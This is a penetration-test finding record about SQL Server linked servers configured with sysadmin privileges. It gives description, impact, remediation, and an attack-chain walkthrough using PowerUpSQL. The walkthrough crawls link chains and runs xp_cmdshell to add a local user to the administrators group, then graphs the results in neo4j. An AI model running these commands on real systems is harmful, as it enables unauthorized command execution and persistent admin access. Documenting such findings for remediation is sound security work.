{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":3389068,"exploitInstructions":"","verificationInstructions":"<br><h2>Variation: Standard Link Server Attack Chain</h2><br>This assumes you have already have a valid SQL Server login.<br><br>1. Import PowerUpSQL.<br><br><code><b>cmd.exe</b><br><b>runas /netonly /user:addomain.com\\domain_user powershell_ise.exe</b><br><b>Import-module PowerUpSQL.psd1</b><br></code><br><br>2. List linked SQL Servers.<br><br><code><b>Get-SQLQuery -Verbose - Instance &quot;sqlserver\\instance1&quot; -Query &quot;SELECT &#42; FROM master..sysservers&quot;</b><br></code><br>Raw Query<br><code><b>SELECT &#42; FROM master..sysservers</b><br></code><br><br>3. Test access to link SQL Servers.<br><br><code><b>Get-SQLQuery -Verbose - Instance &quot;sqlserver\\instance1&quot; -Query &quot;select &#42; from openquery(&lt;LINKED_SERVER&gt;,'select is_srvrolemember(`''sysadmin`'')');&quot;</b> <br></code><br>Raw Query<br><code><b>select &#42; from openquery(&lt;LINKED_SERVER&gt;,'select is_srvrolemember(''sysadmin'')');</b><br></code><br>4. Execute test query against remote links.<br><br><code><b>Get-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select @@SERVERNAME as Instance,name from master..sysdatabases where has_dbaccess(name) = 1&quot; | %{ $_.customquery} </b><br><br>Instance Linked Server Path                               Database Name                                                        <br>---------------------------                               -------------                                                        <br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer4\\ISQLQ01           Projects<br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   App1_Prod                                                    <br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   App1_Dev                                                <br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   Asset Database                                          <br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   Asset Database                                      <br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer2                   Backup Database                                      <br>SQLServer1\\SQLEXPRESS - &gt; LinkedServer3\\ISQLP01           Projects    <br></code><br>5. Execute commands through a link and create a local administrator.<br><br><code>&#35; Ping server<br>Get-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select 1;exec master..xp_cmdshell 'ping 10.57.9.23'&quot;| %{ $_.customquery} <br><br>&#35; Add local user<br>Get-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select 1;exec master..xp_cmdshell 'net user netspi [REDACTED] /add'&quot;| %{ $_.customquery} <br><br>&#35; Add local user to Administrator group<br>Get-SQLServerLinkCrawl -Verbose -Instance SQLServer1\\SQLEXPRESS -Query &quot;select 1;exec master..xp_cmdshell 'net localgroup administrators /add netspi'&quot;| %{ $_.customquery} <br></code><br> <br><h2>Variation: Find Instances, Test Access, Map Links, and Generate a Pretty Csv</h2><br>1. Open cmd.exe and run as the a domain user.<br><code>cmd.exe<br>runas /netonly /user:addomain.com\\domain_user powershell_ise.exe<br></code><br>2. Download PowerUpSQL from powerupsql.com and import it into the PowerShell session.<br><code>Import-module PowerUpSQL.psd1<br></code><br>3. Get an inventory of all SQL Servers for the domain.<br><code>$DomainInstances = Get-SQLInstanceDomain -verbose -DomainController domaincomputer1.addomain.com -Username &quot;addomain.com\\domain_user&quot; -Password [REDACTED]<br></code><br>4. Attempt to connect to each instance and enumeration available SQL Server links and crawl them.<br><code>$SQLServerLinks = $DomainInstances | Get-SQLServerLinkCrawl -verbose<br></code><br>5. Parse results into pretty csv output.<br><code>$CsvResults = $SQLServerLinks |<br>foreach {<br> [string]$StringLinkPath = &quot;&quot;<br> $Path = $_.path<br> $PathCount = $Path.count - 1<br> $LinkSrc = $Path[$PathCount - 1]<br> $LinkDes = $Path[$PathCount]<br> $LinkUser = $_.user<br> $LinkDesSysadmin = $_.Sysadmin<br> $Instance = $_.instance<br> $LinkDesVersion = $_.Version<br> $Path |<br> foreach {<br> if ( $StringLinkPath -eq &quot;&quot;){<br> [string]$StringLinkPath = &quot;$_&quot;<br> }else{<br> [string]$StringLinkPath = &quot;$StringLinkPath -&gt; $_&quot;<br> }<br> }<br> $Object = New-Object PSObject<br> $Object | add-member Noteproperty LinkSrc $LinkSrc<br> $Object | add-member Noteproperty LinkName $LinkDes<br> $Object | add-member Noteproperty LinkInstance $Instance<br> $Object | add-member Noteproperty LinkUser $LinkUser<br> $Object | add-member Noteproperty LinkSysadmin $LinkDesSysadmin<br> $Object | add-member Noteproperty LinkVersion $LinkDesVersion<br> $Object | add-member Noteproperty LinkHops $PathCount<br> $Object | add-member Noteproperty LinkPath $StringLinkPath<br> $Object<br>}<br>$CsvResults | export-csv -NoTypeInformation addomain.com-SQL-ServerLinks.csv<br></code><br>6. Export results to CSV.<br><code>$CsvResults |  Export-Clixml c:\\temp\\links.xml <br></code><br>7. Graph results.<br><br>Reference:  https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql.<br><br>The exported XML file will then be parsed into a node file and link file so they can be imported into neo4j database. The following script will create the import files and it does provide the required <a href='https://neo4j.com/developer/cypher-query-language/'>Cypher</a> statements to create the graph. Obviously, all the file paths are hardcoded in PowerShell so those will have to be replaced if you run the script. And the last (optional) Cypher statements create a start node to indicate where the crawl started; the ServerId should be manually updated to point to the first SQL Server that was accessed. <br> <br><code>$List = Import-CliXml 'C:\\temp\\links.xml'<br>$Servers = $List | select name,version,path,user,sysadmin -unique | where name -ne 'broken link'<br>$Outnodes = @()<br>$Outpaths = @()<br>foreach($Server <b>in</b> $Servers){<br>   $Outnodes += &quot;$([string][math]::abs($Server.Name.GetHashCode())),$($Server.Name),$($Server.Version)&quot;<br><b>if</b>($Server.Path.Count -ne 1){<br>       $Parentlink = $Server.Path[-2]<br>foreach($a <b>in</b> $Servers){<br><b>if</b>(($a.Path[-1] -eq $Parentlink) -or ($a.Path -eq $Parentlink)){<br>[string]$Parentname = $a.Name<br>               break<br>}<br>}<br>$Outpaths += &quot;$([math]::abs($Parentname.GetHashCode())),$([math]::abs($Server.Name.GetHashCode())),$($Server.User),$($Server.Sysadmin)&quot;<br>}<br>}<br>$Outnodes | select -unique | out-file C:\\pathtoneo4j\\Neo4j\\default.graphdb\\Import\<br>odes.txt<br>$Outpaths | select -unique | out-file C:\\ pathtoneo4j \\default.graphdb\\Import\\links.txt<br><br>&lt;&#35;<br>[OPTIONAL] Cypher to clear the neo4j database:<br>MATCH (n)<br>OPTIONAL MATCH (n)-[r]-()<br>DELETE n,r<br>--<br>Cypher statement to create a neo4j graph - load nodes<br>LOAD CSV FROM &quot;file:///nodes.txt&quot; AS row<br>CREATE (:Server {ServerId: toInt(row[0]), Name:row[1], Version:row[2]});<br>---<br>Cypher statement to create a neo4j graph - load links<br>USING PERIODIC COMMIT<br>LOAD CSV FROM &quot;file:///links.txt&quot; AS row<br>MATCH (p1:Server {ServerId: toInt(row[0])}), (p2:Server {ServerId: toInt(row[1])})<br>CREATE (p1)-[:LINK {User: row[2], Sysadmin: row[3]}]-&gt;(p2);<br>---<br>[OPTIONAL] Cypher statement to create a start node which indicates where the crawl started. <b>This</b> is not automated; first node id must be filled <b>in</b> manually (i.e. replace 12345678 with the first node's id).<br>CREATE (:Start {Id: 1})<br>[OPTIONAL] Link start node to the first server<br>MATCH (p1:Start {Id: 1}), (p2:Server {ServerId: 12345678})<br>CREATE (p1)-[:START]-&gt;(p2);<br>&#35;&gt;<br></code><br><br>","remediationInstructions":"If database links are not required for a defined business purpose they should be removed from the server.  If a database links is required, all login mappings should be configured using the principle of least privilege.  Database links should never be configured with sysadmin privileges.  <br>The default mapping for a linked server configuration is to emulate the current security credentials of the login. This kind of mapping is known as self-mapping. When a linked server is added by using sp_addlinkedserver, a default self-mapping is added for all local logins. If security account delegation is available and the linked server supports Windows Authentication, self-mapping for the Windows authenticated logins is supported.  Microsoft recommends using Windows Authentication as a best practice.<br><br>Linked servers configured with sysadmin privileges can be identified with the following instructions:<br><br><b>List linked servers</b><br><code>select &#42; from master..sysservers<br></code><br><br><b>Test linked servers for sysadmin privileges</b><br><code>select &#42; from openquery(&lt;LINKED_SERVER&gt;,'select is_srvrolemember(''sysadmin'')');<br></code><br>","name":"Excessive Privileges - SQL Server - Linked Server","sourceId":"M:3389068","severity":"Medium","businessImpact":"Attackers are able compromise the confidentiality, integrity and availability of each linked database server configured with sysadmin privileges.  The affected database links allow attackers to access sensitive data and execute arbitrary commands on the affected servers.","description":"At least one database link was discovered with a login mapping configured with excessive privileges.  A linked server configuration enables SQL Server to execute commands against OLE DB data sources on remote servers. <br>Linked servers configured with least privilege support functionality:<br><ul><li>The ability to issue distributed queries, updates, commands, and transactions on heterogeneous data sources across the enterprise.</li><br><li>The ability to address diverse data sources similarly.</li><br><li>The ability to crawl database link chains.</li><br></ul><br>Linked servers configured with excessive privilege support functionality:<br><ul><li>The ability to execute arbitrary commands on the operating system with the privileges of the SQL Server service account.</li><br><li>The ability to read arbitrary files from operating system with the privileges of the SQL Server service account.</li><br><li>The ability to issue distributed queries, updates, commands, and transactions on heterogeneous data sources across the enterprise.</li><br><li>The ability to address diverse data sources similarly.</li><br><li>The ability to crawl database link chains.</li><br></ul><br>"}}}